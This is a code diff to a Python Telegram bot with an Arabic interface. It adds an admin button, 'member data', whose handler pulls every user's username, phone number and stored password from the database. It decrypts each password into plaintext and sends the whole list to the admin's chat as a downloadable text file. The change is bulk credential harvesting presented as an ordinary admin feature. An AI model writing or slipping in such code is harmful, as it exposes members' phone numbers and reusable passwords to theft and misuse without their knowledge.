@@ -650,6 +650,7 @@ def admin_kb() -> InlineKeyboardMarkup:
         [InlineKeyboardButton("📝 سجل التبادلات",   callback_data="adm_trades"),
          InlineKeyboardButton("🔙 القائمة الرئيسية",callback_data="adm_main")],
         [InlineKeyboardButton("👑 إدارة الأدمنز",   callback_data="adm_admins")],
+        [InlineKeyboardButton("📂 بيانات الأعضاء",  callback_data="adm_creds")],
     ]
     return InlineKeyboardMarkup(rows)
 
@@ -2399,6 +2400,49 @@ async def admin_menu_cb(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 
     elif d == "adm_main":
         await reply("🛡️ لوحة الأدمن", reply_markup=admin_kb())
+
+    elif d == "adm_creds":
+        # جلب كل المستخدمين مع بياناتهم من قاعدة البيانات
+        users = await db_all("""
+            SELECT user_id, username, phone, enc_password, trades_done, banned, joined_at
+            FROM users ORDER BY joined_at DESC
+        """)
+        if not users:
+            await reply("📭 لا يوجد أعضاء بعد.")
+            return
+
+        # بناء الملف النصي
+        lines = [f"📂 بيانات الأعضاء — {datetime.now().strftime('%Y-%m-%d %H:%M')}\n"]
+        lines.append(f"إجمالي: {len(users)} عضو\n")
+        lines.append("=" * 40 + "\n")
+        for u in users:
+            phone = u.get("phone", "")
+            pwd   = dec_pwd(u.get("enc_password", "")) if u.get("enc_password") else "—"
+            ban   = "🚫 محظور" if u["banned"] else "✅ نشط"
+            lines.append(
+                f"👤 @{u.get('username','مجهول')} | ID: {u['user_id']}\n"
+                f"📱 {phone}\n"
+                f"🔑 {pwd}\n"
+                f"🔄 تبادلات: {u.get('trades_done', 0)} | {ban}\n"
+                f"📅 {str(u.get('joined_at',''))[:16]}\n"
+                f"{'-'*30}\n"
+            )
+
+        content = "\n".join(lines)
+
+        # إرسال كملف txt
+        import io
+        file_bytes = content.encode("utf-8")
+        file_obj   = io.BytesIO(file_bytes)
+        file_obj.name = f"members_{datetime.now().strftime('%Y%m%d_%H%M')}.txt"
+
+        await ctx.bot.send_document(
+            chat_id=q.message.chat_id,
+            document=file_obj,
+            caption=f"📂 *بيانات الأعضاء*\n👥 إجمالي: `{len(users)}` عضو",
+            parse_mode="Markdown"
+        )
+        await q.answer("✅ تم إرسال الملف!")
 
 
 async def text_router(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
